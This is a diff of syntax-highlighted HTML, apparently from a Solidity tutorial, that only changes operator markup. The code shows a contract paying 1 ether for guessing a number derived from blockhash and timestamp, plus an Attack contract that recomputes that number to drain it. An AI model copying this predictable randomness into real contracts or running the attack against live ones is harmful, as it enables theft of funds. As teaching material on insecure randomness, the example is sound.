@@ -35,12 +35,12 @@ Attack computed the correct answer by simply copying the code that computes the 
     <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{}
 
     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">guess</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _guess</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
-        <span class="hljs-keyword">uint</span> answer = <span class="hljs-keyword">uint</span>(
-            <span class="hljs-built_in">keccak256</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodePacked</span>(<span class="hljs-built_in">blockhash</span>(<span class="hljs-built_in">block</span>.<span class="hljs-built_in">number</span> - <span class="hljs-number">1</span>), <span class="hljs-built_in">block</span>.<span class="hljs-built_in">timestamp</span>))
+        <span class="hljs-keyword">uint</span> answer <span class="hljs-operator">=</span> <span class="hljs-keyword">uint</span>(
+            <span class="hljs-built_in">keccak256</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodePacked</span>(<span class="hljs-built_in">blockhash</span>(<span class="hljs-built_in">block</span>.<span class="hljs-built_in">number</span> <span class="hljs-operator">-</span> <span class="hljs-number">1</span>), <span class="hljs-built_in">block</span>.<span class="hljs-built_in">timestamp</span>))
         );
 
-        <span class="hljs-keyword">if</span> (_guess == answer) {
-            (<span class="hljs-keyword">bool</span> sent, ) = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value</span>: <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>}(<span class="hljs-string">""</span>);
+        <span class="hljs-keyword">if</span> (_guess <span class="hljs-operator">=</span><span class="hljs-operator">=</span> answer) {
+            (<span class="hljs-keyword">bool</span> sent, ) <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value</span>: <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>}(<span class="hljs-string">""</span>);
             <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);
         }
     }
@@ -50,8 +50,8 @@ Attack computed the correct answer by simply copying the code that computes the 
     <span class="hljs-function"><span class="hljs-keyword">receive</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{}
 
     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params">GuessTheRandomNumber guessTheRandomNumber</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
-        <span class="hljs-keyword">uint</span> answer = <span class="hljs-keyword">uint</span>(
-            <span class="hljs-built_in">keccak256</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodePacked</span>(<span class="hljs-built_in">blockhash</span>(<span class="hljs-built_in">block</span>.<span class="hljs-built_in">number</span> - <span class="hljs-number">1</span>), <span class="hljs-built_in">block</span>.<span class="hljs-built_in">timestamp</span>))
+        <span class="hljs-keyword">uint</span> answer <span class="hljs-operator">=</span> <span class="hljs-keyword">uint</span>(
+            <span class="hljs-built_in">keccak256</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodePacked</span>(<span class="hljs-built_in">blockhash</span>(<span class="hljs-built_in">block</span>.<span class="hljs-built_in">number</span> <span class="hljs-operator">-</span> <span class="hljs-number">1</span>), <span class="hljs-built_in">block</span>.<span class="hljs-built_in">timestamp</span>))
         );
 
         guessTheRandomNumber.guess(answer);
